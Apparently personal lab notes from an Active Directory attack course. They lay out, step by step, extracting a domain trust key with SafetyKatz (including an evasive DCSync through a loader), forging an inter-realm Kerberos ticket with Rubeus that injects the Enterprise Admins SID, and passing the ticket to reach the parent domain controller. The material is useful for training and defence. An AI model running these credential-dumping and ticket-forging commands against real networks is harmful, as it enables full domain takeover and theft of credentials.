# Also check out Krbtgt Secret Abuse

extract the trust key (any of these three)
`SafetyKatz.exe "lsadump::trust /patch"`
`SafetyKatz.exe "lsadump::dcsync /user:<compaed_DOMAIN>\<trust_account>"`
- i.e. `/user:dcorp\mcorp$`
`SafetyKatz.exe "lsadump::lsa /patch"`


Forge an inter-realm TGT using Rubeus
`C:\AD\Tools\Rubeus.exe silver /service:krbtgt/<DOMAIN> /rc4:<hash> /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /ldap /user:Administrator /nowrap`
- rc4 is the trust key extracted from SafetyKatz
- SID is the SID of the compromised domain
- /ldap receives PAC information from the current DC
- 519 at the end of /sids is the RID of enterprise admins


Use the forged ticket
`C:\AD\Tools\Rubeus.exe asktgs /service:<SPN> /dc:<target_DOMAIN> /ptt /ticket:<forged_ticket>`




# Learning Objective 18

## Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA of the parent domain, moneycorp.local, using the domain trust key

Extract the trust key using DCSync
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\mcorp$" "exit"`
![Pasted image 20260224032617](assets/Pasted%20image%2020260224032617.png)
- trust key treated sort of as a machine account (may rotate within 30 days
	- both DCs must agree to the rotation
- this is all you need DA privs for


Use the trust key to forge the inter-domain TGT
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:7a74... /sid:S-1-5-21-... /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap`
![Pasted image 20260224033134](assets/Pasted%20image%2020260224033134.png)
![Pasted image 20260224033113](assets/Pasted%20image%2020260224033113.png)


Request the TGS for the other domain
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.local /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<ticket>`
![Pasted image 20260224033157](assets/Pasted%20image%2020260224033157.png)
![Pasted image 20260224033214](assets/Pasted%20image%2020260224033214.png)


Access the new DC with winrs
![Pasted image 20260224033257](assets/Pasted%20image%2020260224033257.png)

